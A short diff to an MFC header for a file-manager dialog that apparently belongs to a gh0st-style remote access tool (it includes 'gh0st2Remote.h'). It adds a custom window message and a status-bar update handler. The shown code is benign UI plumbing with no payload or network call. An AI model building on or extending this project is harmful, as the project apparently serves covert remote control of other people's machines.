@@ -6,6 +6,8 @@
 #endif // _MSC_VER > 1000
 #include "gh0st2Remote.h"
 
+#define WM_MY_MESSAGE (WM_USER+300)
+
 // FileManagerDlg.h : header file
 //
 
@@ -15,6 +17,16 @@ typedef CList<CString, CString&> strList;
 
 class CFileManagerDlg : public CDialog
 {
+protected:
+	// 更新状态栏信息
+	afx_msg LRESULT OnMyMessage(WPARAM wParam, LPARAM lParam)
+	{
+		char *buff = (char*)lParam;
+		m_wndStatusBar.SetPaneText(0, buff);
+		delete[]buff;
+		return S_OK;
+	} 
+
 // Construction
 public:
 	bool m_bIsStop;
